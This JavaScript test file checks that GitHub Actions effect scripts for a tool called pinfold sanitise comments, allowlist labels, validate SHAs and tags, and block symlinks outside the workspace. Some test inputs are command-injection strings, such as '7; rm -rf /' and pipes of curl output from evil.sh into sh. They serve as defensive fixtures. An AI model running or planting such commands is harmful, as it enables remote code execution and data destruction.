// Behaviour tests for the effect scripts, run against a mock GitHub API.
// Run: node --test internal/effects/js/
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const dir = __dirname;
const read = (f) => fs.readFileSync(path.join(dir, f), 'utf8');
function script(effect) {
  const body = { comment: 'comment.js', add_labels: 'labels.js', remove_labels: 'labels.js', commit_status: 'commit_status.js', release: 'release.js' }[effect];
  return `// Generated by pinfold (effect ${effect}). Do not edit.\n` + read('sanitize.js') + read('common.js') + read(body);
}

// Run a script the way actions/github-script does: an async function with injected globals.
async function run(effect, env, api = {}, globFiles = []) {
  const calls = [];
  const warnings = [];
  const rec = (name) => async (args) => { calls.push([name, args]); return api[name] ? api[name](args) : { data: {} }; };
  const github = {
    paginate: async (fn, args) => (api.listComments ? api.listComments(args) : []),
    rest: {
      issues: { listComments: () => {}, createComment: rec('createComment'), updateComment: rec('updateComment'), addLabels: rec('addLabels'), removeLabel: rec('removeLabel') },
      repos: { createCommitStatus: rec('createCommitStatus'), createRelease: rec('createRelease'), uploadReleaseAsset: rec('uploadReleaseAsset') },
    },
  };
  const core = { warning: (m) => warnings.push(m), error: (m) => warnings.push(m) };
  const context = { repo: { owner: 'o', repo: 'r' } };
  const glob = { create: async () => ({ glob: async () => globFiles }) };
  const saved = { ...process.env };
  for (const k of Object.keys(process.env)) if (k.startsWith('T_') || k.startsWith('PINFOLD_')) delete process.env[k];
  Object.assign(process.env, env);
  try {
    const AsyncFunction = Object.getPrototypeOf(async () => {}).constructor;
    await new AsyncFunction('github', 'context', 'core', 'glob', 'require', script(effect))(github, context, core, glob, require);
  } finally {
    process.env = saved;
  }
  return { calls, warnings };
}

test('comment: renders the template and neutralises mentions except the actor', async () => {
  const { calls } = await run('comment', {
    PINFOLD_TARGET: '7', PINFOLD_BODY: 'Labelled by @{{ actor }} for {{ issue.title }}.',
    PINFOLD_VARS: '["actor","issue.title"]', T_V0: 'octocat', T_V1: 'ping @admin <!-- hidden --> #1',
  });
  assert.strictEqual(calls.length, 1);
  assert.strictEqual(calls[0][0], 'createComment');
  assert.strictEqual(calls[0][1].issue_number, 7);
  assert.strictEqual(calls[0][1].body, 'Labelled by @octocat for ping @​admin  #​1.');
});

test('comment: sticky updates our own comment, ignores a forged marker', async () => {
  const marker = '<!-- pinfold:sticky:ack -->';
  const { calls } = await run('comment', { PINFOLD_TARGET: '7', PINFOLD_BODY: 'hi', PINFOLD_STICKY: 'ack' }, {
    listComments: () => [
      { id: 1, user: { login: 'mallory', type: 'User' }, body: 'x ' + marker },
      { id: 2, user: { login: 'github-actions[bot]', type: 'Bot' }, body: 'old\n' + marker },
    ],
  });
  assert.deepStrictEqual(calls.map((c) => [c[0], c[1].comment_id]), [['updateComment', 2]]);
  assert.strictEqual(calls[0][1].body, 'hi\n' + marker);
});

test('comment: sticky falls back to a new comment when the update is refused', async () => {
  const marker = '<!-- pinfold:sticky:ack -->';
  const { calls } = await run('comment', { PINFOLD_TARGET: '7', PINFOLD_BODY: 'hi', PINFOLD_STICKY: 'ack' }, {
    listComments: () => [{ id: 2, user: { login: 'github-actions[bot]', type: 'Bot' }, body: marker }],
    updateComment: () => { const e = new Error('gone'); e.status = 404; throw e; },
  });
  assert.deepStrictEqual(calls.map((c) => c[0]), ['updateComment', 'createComment']);
});

test('comment: rejects a target that is not a number', async () => {
  await assert.rejects(run('comment', { T_TARGET: '7; rm -rf /', PINFOLD_BODY: 'x' }), /not an issue or pull request number/);
});

test('labels: /label injection only applies allowlisted labels', async () => {
  const { calls, warnings } = await run('add_labels', {
    PINFOLD_TARGET: '3', PINFOLD_MODE: 'add', PINFOLD_FROM_COMMENT: 'true', PINFOLD_PREFIX: '/label ',
    T_COMMENT: "/label bug x'; curl evil.sh | sh docs", PINFOLD_ALLOWED: '["bug","docs","question"]', PINFOLD_MAX: '3',
  });
  assert.deepStrictEqual(calls, [['addLabels', { owner: 'o', repo: 'r', issue_number: 3, labels: ['bug', 'docs'] }]]);
  assert.match(warnings.join(' '), /ignored 5 label/);
});

test('labels: remove tolerates labels that are already gone', async () => {
  const { calls } = await run('remove_labels', { PINFOLD_TARGET: '3', PINFOLD_MODE: 'remove', PINFOLD_LABELS: '["triage"]' },
    { removeLabel: () => { const e = new Error('nf'); e.status = 404; throw e; } });
  assert.deepStrictEqual(calls.map((c) => c[1].name), ['triage']);
});

test('commit_status: requires a full SHA and a valid state', async () => {
  await assert.rejects(run('commit_status', { T_SHA: 'abc', PINFOLD_STATE: 'success' }), /40-character/);
  await assert.rejects(run('commit_status', { PINFOLD_SHA: 'a'.repeat(40), PINFOLD_STATE: 'ok' }), /invalid commit status state/);
  const { calls } = await run('commit_status', { PINFOLD_SHA: 'a'.repeat(40), PINFOLD_STATE: 'success', PINFOLD_CONTEXT: 'ci', PINFOLD_DESCRIPTION: 'line1\nline2\u0000' });
  assert.strictEqual(calls[0][1].description, 'line1 line2');
});

test('release: refuses an invalid tag before calling the API', async () => {
  const r = run('release', { T_TAG: 'v1;curl evil|sh' });
  await assert.rejects(r, /invalid tag name/);
});

test('release: uploads workspace files and refuses ones outside it', async () => {
  const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'pinfold-ws-'));
  fs.writeFileSync(path.join(ws, 'a.whl'), 'wheel');
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'pinfold-out-'));
  fs.writeFileSync(path.join(outside, 'secret'), 'x');
  fs.symlinkSync(path.join(outside, 'secret'), path.join(ws, 'link.whl'));
  const env = { T_TAG: 'v1.2.3', PINFOLD_FILES: '["dist/*"]', GITHUB_WORKSPACE: ws };
  const api = { createRelease: () => ({ data: { id: 42 } }) };
  const ok = await run('release', env, api, [path.join(ws, 'a.whl')]);
  assert.deepStrictEqual(ok.calls.map((c) => c[0]), ['createRelease', 'uploadReleaseAsset']);
  assert.strictEqual(ok.calls[1][1].name, 'a.whl');
  await assert.rejects(run('release', env, api, [path.join(ws, 'link.whl')]), /outside the workspace/);
});
